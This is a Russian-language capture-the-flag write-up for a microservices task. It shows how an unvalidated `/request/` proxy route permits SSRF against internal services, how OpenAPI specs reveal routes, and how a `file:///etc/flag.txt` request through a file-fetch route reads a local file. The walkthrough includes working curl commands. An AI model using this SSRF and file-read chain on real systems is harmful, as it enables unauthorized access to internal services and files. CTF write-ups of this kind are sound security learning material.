# Микросервис за микросервисом

## Исследование

Имеем простенький фронт, на котором только отображается немного данных. Если залезем в devtools, то увидим что делаются запросы на сервисы, которые возвращает ручка `/active`:

```
[
  {
    "id": 0,
    "is_public": true,
    "protocol": "OpenAPI",
    "name": "ChaikaCleaning",
    "addr": "cleaning-chaika-local"
  },
  {
    "id": 1,
    "is_public": true,
    "protocol": "OpenAPI",
    "name": "ChaikaDoormanCargo",
    "addr": "doorman-chaika-local"
  },
  {
    "id": 2,
    "is_public": true,
    "protocol": "OpenAPI",
    "name": "ChaikaFlagsLaundry",
    "addr": "laundry-chaika-local"
  },
  {
    "id": 3,
    "is_public": false,
    "protocol": "OpenAPI",
    "name": "ChaikaOffices",
    "addr": "offices-chaika-local"
  }
]
```

Отображается только то, что имеет параметр `is_public=true`. Но нас интересует то, как выполняется запрос:
```
function getHelloFromService(serveraddr) {
            var req = new XMLHttpRequest();
            req.open("GET", '/request/http://' + serveraddr + "/", false);
            console.log("REQUESTING " + '/request/http://' + serveraddr + "/");
            req.send();
            return resp = JSON.parse(JSON.parse(req.response)['Data'])['message'];
        }
```
Т.е. делается запрос в интранет без валидации или проверок. На лицо - уязвимость класса `SSRF`. Но где флаг?

Если мы перейдем на какой-нибудь из сервисов, то увидим, что на `/` просто возвращается hello из сервиса. Но в информации о сервисах есть подсказка: `"protocol": "OpenAPI"`. Если попробовать сделать запрос на стандартную ручку `/docs` то нам что-то вернется, но есть проблема - нам возвращается просто текстовый выхлоп, а не рендер странички. Соответственно делаем запрос к json, который возвращает информацию о роутах в `/docs` - `/openapi.json`.

В случае с сервисом `ChaikaFlagsLaundry` этот путь нас выведет на фейковый флаг и мем с Каневским. Правильный путь - сделать запрос на сервис `ChaikaOffices` и изучить роуты на нем.

Маленькой сложностью может быть то, что url необходимого сервиса передается на роут `/request` в качестве path-параметра. Это слегка нарушает ряд RFC, но если так можно делать - кто-то точно делает :)

## Эксплуатация

Делаем запрос на роуты в сервисе офисов:
```
-> $ curl "http://127.0.0.1:7513/request/http://offices.chaika.local/openapi.json"
```
Узнаем, что там есть следующие роуты:
- `/`
- `/getoffice`
- `/file/{href}`

Второй роут даст нам подсказку, что третий роут предназначен для того, чтобы вытаскивать файлы с сервиса напрямую. Пытаемся вытащить флаг при помощи URI схемы `file://`:
```
-> $ curl "http://176.114.65.9:26564/request/http://offices-chaika-local/file/file:///etc/flag.txt"
{
    Status: "Ok",
    Data: "{\"Status\":\"Ok\",\"Data\":\"crab{r00m_s3rv1c3_w1th_4_t4st3_0f_3xpl0it_621888d48ee067}\"}"
}
```

## Флаг

`crab{r00m_s3rv1c3_w1th_4_t4st3_0f_3xpl0it_*}`
